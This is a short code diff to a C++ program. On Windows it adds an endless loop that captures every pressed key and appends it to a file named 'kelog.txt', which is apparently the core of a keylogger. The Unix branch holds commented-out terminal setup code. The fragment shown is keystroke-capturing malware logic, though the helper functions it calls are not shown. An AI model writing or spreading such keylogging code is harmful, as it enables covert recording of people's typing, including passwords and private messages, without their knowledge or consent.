@@ -6,7 +6,9 @@ using namespace std;
 int main() {
     #if defined(__WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
     cout << "Windows\r\n";
-
+    while (1) {
+        writeToFile("kelog.txt", getAscii(getPressedKeyboardState()));
+    }
     #elif __unix__
     /*struct termios old, new;
     tcgetattr( fileno( stdin ), &oldSettings );
